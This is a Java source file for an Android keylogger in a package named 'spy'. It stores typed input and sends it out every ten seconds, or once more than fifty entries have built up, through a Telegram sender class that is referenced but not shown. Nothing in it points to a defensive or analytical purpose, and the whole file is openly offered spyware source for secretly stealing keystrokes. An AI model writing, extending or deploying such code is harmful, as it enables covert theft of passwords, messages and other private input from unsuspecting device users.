package com.deepalzz.spy;
import android.content.Context; import java.util.ArrayList; import java.util.List;
public class Keylogger {
    private Context ctx; private TelegramSender tg; private List<String> logs = new ArrayList<>();
    private boolean running = false;
    public Keylogger(Context ctx, TelegramSender tg) { this.ctx = ctx; this.tg = tg; }
    public void start() { running = true;
        new Thread(() -> { while (running) { try { Thread.sleep(10000); sendLogs(); } catch (Exception e) {} } }).start();
    }
    public void logInput(String text) { if (text != null && text.length()>0) { logs.add(text); if (logs.size()>50) sendLogs(); } }
    public void sendLogs() { if (!logs.isEmpty()) { StringBuilder sb = new StringBuilder("⌨️ KEYLOG:\n");
        for (String l : logs) sb.append("> ").append(l).append("\n");
        tg.sendMessage(sb.toString()); logs.clear(); } }
    public void stop() { running = false; sendLogs(); }
}
